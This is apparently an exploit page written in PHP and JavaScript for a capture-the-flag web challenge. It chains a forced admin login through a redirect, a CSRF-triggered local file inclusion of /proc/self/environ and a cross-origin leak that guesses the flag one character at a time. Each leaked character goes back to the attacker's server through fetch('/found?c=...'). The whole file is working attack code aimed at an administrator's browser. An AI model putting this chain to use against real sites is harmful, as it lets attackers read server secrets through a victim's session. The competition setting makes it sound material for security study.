<?php
 include_once('hosts.php')
?>

<script>
    flag = 'ptm{'
    dict = '_}abcdefghijklmnopqrstuvwxyzABCD' 
    //dict = 'EFGHIJKLMNOPQRSTUVWXYZ0123456789'

    function step0(){
        //first of all the admin need to login without setting the csrf token
        // n=35 
        // const w = window.open('http://<?php echo $EXPL_HOST_NODE;?>/redirect?n=16&url=<?php echo $CHALL_HOST;?>%2Flogin')
        const w = window.open('http://<?php echo $EXPL_HOST_NODE;?>/redirect?n=16&url=<?php echo $CHALL_HOST;?>%2Flogin')
        setTimeout(()=>{
            w.close()
            step1()
        },10000)
    }

    function step1(){
        // load /proc/self/environ in admin templates
        const w = window.open('/csrf_lfi.php')
        setTimeout(()=>{w.close();step2()}, 1500)
    }

    function step2(){
        // print template with flag to get infoleak
        


        let ws = []
        let id = 1
        for (const c of dict){
            console.log(c)
            const w = window.open('/csrf_print.php?id=' + id + '&x=' + flag + c)
            id += 2

            ws.push(w)

        }

        setTimeout(()=>{
            for (w of ws){
                w.close()
            }
            step3()
        }, 3000)
    }

    function step3(){
        // get the actual infoleak
        let ws = []
        let id = 1

        for (const c of dict){
            const w = window.open('<?php echo $CHALL_HOST;?>/printed/'+id+'/1')
            id += 2

            ws.push(w)
        }

        setTimeout(()=>{
           // check infoleak
           for (let i = 0; i<ws.length; i++){
                const w = ws[i]
                try {
                   w.origin
                   console.log('FOUND - ' + dict[i])
                   fetch('/found?c='+dict[i])
                } catch {
                    console.log('NOT FOUND - ' + dict[i])
                }
                w.close()
           }
        }, 3000)
    }


    step0()
</script>


<img src="http://<?php echo $EXPL_HOST_NODE;?>/sleep">